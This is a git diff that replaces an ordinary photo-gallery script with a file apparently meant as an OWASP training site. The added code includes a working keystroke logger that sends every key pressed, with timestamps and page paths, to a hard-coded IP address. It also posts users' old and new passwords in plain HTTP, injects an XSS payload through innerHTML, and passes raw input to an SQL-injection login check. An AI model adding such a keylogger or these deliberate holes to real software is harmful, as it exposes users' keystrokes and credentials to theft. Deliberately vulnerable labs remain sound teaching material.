@@ -1,92 +1,162 @@
-function filterByUsername() {
-    const input = document.getElementById('searchInput').value.toLowerCase();
-    const cards = document.querySelectorAll('.masonry-item');
-  
-    cards.forEach(card => {
-      const username = card.getAttribute('data-username')?.toLowerCase() || '';
-      card.style.display = username.includes(input) ? 'block' : 'none';
-    });
+// OWASP Attacking Website JS (Website.js)
+
+// --- 1. Keystroke Logger ---
+document.addEventListener("keydown", function (e) {
+  const log = {
+      key: e.key,
+      timestamp: new Date().toISOString(),
+      page: window.location.pathname
+  };
+  // Send data to backend for logging
+  fetch("http://12.12.12.12:8080/log_keystroke", {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(log)
+  });
+});
+
+// --- 2. Image Upload with Weak Filter ---
+document.addEventListener("DOMContentLoaded", () => {
+  const form = document.getElementById("uploadForm");
+  if (form) {
+      form.addEventListener("submit", function (e) {
+          e.preventDefault();
+          const data = new FormData(form);
+          fetch("http://12.12.12.12:8080/upload", {
+              method: "POST",
+              body: data
+          })
+          .then(res => res.json())
+          .then(res => {
+              alert("Image uploaded!");
+              window.location.reload();
+          });
+      });
   }
-  
-  document.getElementById('searchInput').addEventListener('keypress', function (e) {
-    if (e.key === 'Enter') {
-      e.preventDefault();
-      filterByUsername();
-    }
+});
+
+// --- 3. Profile Editor ---
+document.getElementById("saveProfileBtn")?.addEventListener("click", () => {
+  const data = {
+      username: document.getElementById("profileUsername").value,
+      email: document.getElementById("profileEmail").value,
+      newPassword: document.getElementById("profileNewPassword").value,
+      oldPassword: document.getElementById("profileOldPassword").value,
+  };
+
+  fetch("http://12.12.12.12:8080/update_profile", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data),
+  })
+  .then(res => res.json())
+  .then(data => {
+      alert(data.message || "Profile updated.");
   });
-  
-  $('#viewModal').on('show.bs.modal', function (event) {
-    var button = $(event.relatedTarget);
-    var imageSrc = button.data('img');
-    var caption = button.data('caption');
-    var modal = $(this);
-    modal.find('#modalImage').attr('src', imageSrc);
-    modal.find('#modalCaption').text(caption);
-    modal.find('#likeCount').text(Math.floor(Math.random() * 10 + 1));
+});
+
+// --- 4. Logout Handler ---
+document.getElementById("logoutBtn")?.addEventListener("click", () => {
+  fetch("http://12.12.12.12:8080/logout", {
+      method: "POST"
+  }).then(() => {
+      window.location.href = "/login";
   });
-  
-  function setActive(element) {
-    document.querySelectorAll('.sidebar i').forEach(i => i.classList.remove('active'));
-    element.classList.add('active');
+});
+
+// --- 5. Vulnerability Simulators (Simulated XSS, SQLi) ---
+document.querySelectorAll(".xss-link")?.forEach(link => {
+  link.addEventListener("click", () => {
+      const payload = "<script>alert('XSS Attack!')</script>";
+      document.getElementById("vulnerableOutput").innerHTML = payload;
+  });
+});
+
+document.getElementById("sqliForm")?.addEventListener("submit", function (e) {
+  e.preventDefault();
+  const input = document.getElementById("sqliInput").value;
+  fetch("http://12.12.12.12:8080/check_login?user=" + encodeURIComponent(input))
+      .then(res => res.text())
+      .then(text => alert("Server Response: " + text));
+});
+
+function toggleProfileSection() {
+  const section = document.getElementById('profileSection');
+  section.style.display = section.style.display === 'none' ? 'block' : 'none';
+}
+
+function saveProfileChanges() {
+  // You'd send data to backend here
+  const username = document.getElementById('usernameField').value;
+  const email = document.getElementById('emailField').value;
+  const oldPassword = document.getElementById('oldPassword').value;
+  const newPassword = document.getElementById('newPassword').value;
+  const photo = document.getElementById('changePhotoInput').files[0];
+
+  // Store and send to backend...
+  alert("Saved changes for: " + username);
+}
+
+document.addEventListener("click", function (event) {
+  const profileSection = document.getElementById("profileSection");
+  const profileMenu = document.getElementById("profileMenu");
+
+  if (
+    profileSection &&
+    !profileSection.contains(event.target) &&
+    !event.target.closest('.profile-dropdown')
+  ) {
+    profileSection.style.display = "none";
+    profileMenu.style.display = "none";
   }
-  
-  function toggleProfileSection() {
-    const section = document.getElementById('profileSection');
-    section.style.display = section.style.display === 'block' ? 'none' : 'block';
+});
+
+
+// Toggle profile menu
+const profileIcon = document.getElementById("profileIcon");
+const profileMenu = document.getElementById("profileMenu");
+
+profileIcon.addEventListener("click", function (e) {
+  e.stopPropagation();
+  profileMenu.style.display = "block";
+});
+
+// Hide profile menu when clicking outside
+document.addEventListener("click", function () {
+  profileMenu.style.display = "none";
+});
+
+// Modal logic
+function openProfileEditor() {
+  document.getElementById("profileEditorModal").style.display = "block";
+  profileMenu.style.display = "none";
+}
+
+function closeProfileEditor() {
+  document.getElementById("profileEditorModal").style.display = "none";
+}
+function toggleDropdownMenu() {
+  const menu = document.getElementById("profileMenu");
+  menu.style.display = menu.style.display === "block" ? "none" : "block";
+}
+
+// Hide dropdown when clicking outside
+document.addEventListener("click", function () {
+  const menu = document.getElementById("profileMenu");
+  if (menu) menu.style.display = "none";
+});
+
+
+
+function toggleDropdownMenu() {
+  const menu = document.getElementById('profileMenu');
+  menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
+}
+
+document.addEventListener('click', function (event) {
+  const dropdown = document.querySelector('.profile-dropdown');
+  const menu = document.getElementById('profileMenu');
+  if (!dropdown.contains(event.target)) {
+    menu.style.display = 'none';
   }
-  
-  document.getElementById('uploadForm').addEventListener('submit', function (e) {
-    e.preventDefault();
-    const imageInput = document.getElementById('postImage');
-    const caption = document.getElementById('caption').value;
-  
-    if (imageInput.files && imageInput.files[0]) {
-      const reader = new FileReader();
-      reader.onload = function (e) {
-        const gallery = document.getElementById('imageGallery');
-        const newDiv = document.createElement('div');
-        newDiv.classList.add('masonry-item');
-        newDiv.setAttribute('data-toggle', 'modal');
-        newDiv.setAttribute('data-target', '#viewModal');
-        newDiv.setAttribute('data-img', e.target.result);
-        newDiv.setAttribute('data-caption', caption);
-  
-        newDiv.innerHTML = `
-          <img src="${e.target.result}" alt="User  Upload">
-          <button class="like-btn"><i class="bi bi-heart"></i></button>
-        `;
-        gallery.prepend(newDiv);
-        $('#uploadModal').modal('hide');
-        document.getElementById('uploadForm').reset();
-      };
-      reader.readAsDataURL(imageInput.files[0]);
-    }
-  });
-  
-  function toggleDropdownMenu() {
-    const menu = document.querySelector('.profile-menu');
-    menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
-  }
-  
-  window.addEventListener('click', function (e) {
-    const menu = document.querySelector('.profile-menu');
-    const icon = document.querySelector('.profile-icon');
-    if (!menu.contains(e.target) && e.target !== icon) {
-      menu.style.display = 'none';
-    }
-  });
-  
-  window.addEventListener('click', function (event) {
-    const profileSection = document.getElementById('profileSection');
-    const profileMenu = document.querySelector('.profile-menu');
-    const profileIcon = document.querySelector('.profile-icon');
-  
-    const clickedInsideProfile = profileSection.contains(event.target);
-    const clickedOnIcon = profileIcon.contains(event.target);
-    const clickedInsideMenu = profileMenu.contains(event.target);
-  
-    if (!clickedInsideProfile && !clickedOnIcon && !clickedInsideMenu) {
-      profileSection.style.display = 'none';
-      profileMenu.style.display = 'none';
-    }
-  });
+});
